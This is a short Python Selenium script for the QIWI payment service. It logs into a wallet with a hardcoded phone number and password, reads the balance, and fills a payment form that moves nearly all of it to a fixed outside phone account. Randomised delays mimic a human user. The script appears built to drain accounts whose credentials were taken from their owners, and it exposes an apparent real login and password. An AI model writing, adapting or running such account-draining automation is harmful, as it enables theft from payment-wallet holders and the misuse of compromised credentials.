from seleniumrequests import Firefox
import random
from time import sleep
from selenium.webdriver.common.by import By


class QIWI:
    def __init__(self, login, password):
        self.url = 'https://qiwi.com/'
        self.login = login
        self.password = password
        self.driver = Firefox()

    def sign_in(self):
        self.driver.get(self.url)
        sleep(random.uniform(4, 6))
        self.driver.find_element_by_xpath("//*[contains(text(), 'Войти')]").click()
        sleep(random.uniform(2, 4))

        self.driver.find_element_by_xpath('//input[@value="+7"]').clear()
        sleep(random.uniform(2, 4))

        self.driver.find_element_by_xpath('//input[@value=""]').send_keys(self.login)
        sleep(random.uniform(2, 4))
        self.driver.find_element_by_xpath(
            '/html/body/div[2]/div[2]/div/div[2]/form/div[2]/div[2]/div/div[2]/input').send_keys(self.password)
        sleep(random.uniform(2, 4))
        self.driver.find_element_by_xpath(
            '/html/body/div[2]/div[2]/div/div[2]/form/div[2]/div[3]/div/div/button').click()
        sleep(random.uniform(10, 12))

    def get_balance(self):
        money1 = self.driver.find_elements(By.XPATH, '//div')[1].text
        money = money1.split('\n')
        f = money[7][:-2]
        moneneys = f.split(',')

        return int(moneneys[0])

    def withdraw(self, balance):
        self.driver.get(self.url + "payment/form/99999?extra['accountType']=phone&extra['account']=380684071125")
        sleep(random.uniform(10, 12))
        commision = float(balance / 100)
        print('Коммисия: -{}'.format(commision))

        self.driver.find_elements_by_xpath('//input[@value=""]')[1].send_keys(balance - commision)

    def index(self):
        print('Вхід...\nНомер - {}Пароль:{}'.format(self.login, self.password))
        self.sign_in()
        try:
            if self.get_balance() > 5:
                print('Баланс: {}'.format(self.get_balance()))
                sleep(random.uniform(3, 6))
                self.withdraw(self.get_balance())

            else:
                print('На балансі 0')
                self.driver.quit()
                return -1
        except:
            print('Помилка акк')


q = QIWI('+79213125177', '6uZsY636Lzx3LJb0')
q.index()
